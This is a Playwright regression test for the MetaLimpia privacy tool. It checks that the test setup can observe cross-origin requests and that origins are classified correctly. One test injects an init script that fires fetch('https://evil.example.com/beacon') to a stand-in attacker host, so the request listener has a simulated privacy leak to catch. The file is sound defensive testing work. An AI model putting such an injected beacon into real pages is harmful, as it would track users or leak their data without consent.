/*
 * MetaLimpia — Regression test (Phase 8.5)
 *
 * Verifies that the SAME detection mechanism the privacy guard
 * uses would catch a hypothetical privacy regression. This is
 * not a check of the page itself — the page is clean (the
 * privacy-guard spec asserts that). It's a check that the test
 * infrastructure can OBSERVE cross-origin requests when they
 * occur, so a real future regression would not slip past.
 *
 * Without this test, an infrastructure change (Playwright upgrade,
 * test runner refactor, request-event signature change) could
 * silently neuter the privacy guard without anyone noticing until
 * a real leak slipped through. This spec catches that class of
 * regression.
 *
 * Strategy:
 *   1. Spawn a fresh context.
 *   2. Register a request listener BEFORE navigating.
 *   3. Inject an init script that performs a cross-origin fetch
 *      after the page loads.
 *   4. Navigate, let the page settle, and confirm the listener
 *      captured the injected request.
 *
 * The injected fetch is `https://evil.example.com/beacon` — a
 * deliberately non-existent domain so the request fails at DNS
 * resolution. That failure is irrelevant; we only care that the
 * browser ATTEMPTED the request (the network layer sees it
 * regardless of resolution outcome).
 *
 * If the listener fails to capture this request, the privacy
 * guard is structurally broken and the CI gate would not have
 * caught a real regression.
 */

import { test, expect } from '@playwright/test';

test.describe('Privacy regression — guard infrastructure works', () => {
  test('Playwright detects injected cross-origin fetch', async ({ page, baseURL }) => {
    const pageOrigin = new URL(baseURL).origin;

    /** @type {string[]} */
    const captured = [];
    page.on('request', (req) => captured.push(req.url()));

    // Inject a cross-origin fetch BEFORE the page scripts run.
    // addInitScript runs in every new document before any other
    // script, so the synthetic fetch is fired as early as
    // possible. The fetch target is unreachable on purpose —
    // we only need the browser to ATTEMPT the request so the
    // request listener fires.
    //
    // We deliberately call fetch() with the URL as a string and
    // swallow the rejection — the DNS failure for
    // `evil.example.com` is a network-layer outcome, not a JS
    // outcome. The browser still issues the request, which is
    // what the request listener observes.
    await page.addInitScript(() => {
      // Use queueMicrotask so the fetch happens after the
      // init-script block finishes executing (Playwright fires
      // addInitScript code in a way that lets the document's
      // main thread pick it up cleanly).
      queueMicrotask(() => {
        // eslint-disable-next-line no-undef
        fetch('https://evil.example.com/beacon').catch(() => {});
      });
    });

    await page.goto('/');

    // Wait for the page to finish initial load. We don't need
    // the page to be in any specific view; we just need the
    // injected fetch to have had a chance to fire.
    await expect(page.locator('#dropzone')).toBeVisible();

    // Poll the captured list for the injected URL. Playwright's
    // expect.poll retries the assertion until it passes or the
    // timeout expires — much cleaner than waitForTimeout.
    await expect
      .poll(
        () =>
          captured.filter((url) => {
            try {
              return new URL(url).origin !== pageOrigin;
            } catch {
              return false;
            }
          }).length,
        { timeout: 5_000, message: 'injected cross-origin fetch not detected' }
      )
      .toBeGreaterThan(0);
  });

  test('privacy guard logic classifies origins correctly', async ({ page, baseURL }) => {
    // Pure-logic sanity check that runs in the page context. We
    // build a small list of URLs (mix of same-origin and
    // cross-origin) and assert the same-origin filter the
    // privacy guard uses separates them correctly. This catches
    // a class of bug where someone changes the origin check
    // (e.g. switches to `host` instead of `origin`) and breaks
    // the guard silently.
    await page.goto('/');

    const result = await page.evaluate((base) => {
      // Replicate the production privacy-verifier's classification
      // logic (js/ui/privacyVerifier.js buildReport):
      //   - origin "null" / ""  → opaque scheme (data:, blob:,
      //                              about:), intentionally skipped
      //                              by the verifier — they are not
      //                              network calls to a server
      //   - origin === pageOrigin → internal (count = external)
      //   - anything else           → external
      // We replicate this in the page context so the test checks
      // the SAME rule the production verifier uses.
      const pageOrigin = new URL(base).origin;
      const samples = [
        `${base}/assets/something.js`,
        `${base}/css/styles.css`,
        'https://cdn.example.com/lib.js',
        'https://fonts.googleapis.com/css?family=Inter',
        'http://localhost:4173/different-path/file.png', // same origin
        'data:text/plain;base64,SGVsbG8=', // opaque, not external
        'about:blank', // opaque, not external
      ];
      const classify = (url) => {
        try {
          const origin = new URL(url).origin;
          if (origin === 'null' || origin === '') return 'opaque';
          return origin === pageOrigin ? 'internal' : 'external';
        } catch {
          return 'opaque';
        }
      };
      const buckets = { internal: [], external: [], opaque: [] };
      for (const url of samples) buckets[classify(url)].push(url);
      return {
        pageOrigin,
        total: samples.length,
        externalCount: buckets.external.length,
        externalSamples: buckets.external,
      };
    }, baseURL);

    // The page origin is http://localhost:4173. Of the seven
    // samples, two are cross-origin (cdn.example.com,
    // fonts.googleapis.com); the rest are same-origin or opaque.
    expect(result.pageOrigin).toBe('http://localhost:4173');
    expect(result.total).toBe(7);
    expect(result.externalCount).toBe(2);
    expect(result.externalSamples).toEqual([
      'https://cdn.example.com/lib.js',
      'https://fonts.googleapis.com/css?family=Inter',
    ]);
  });
});
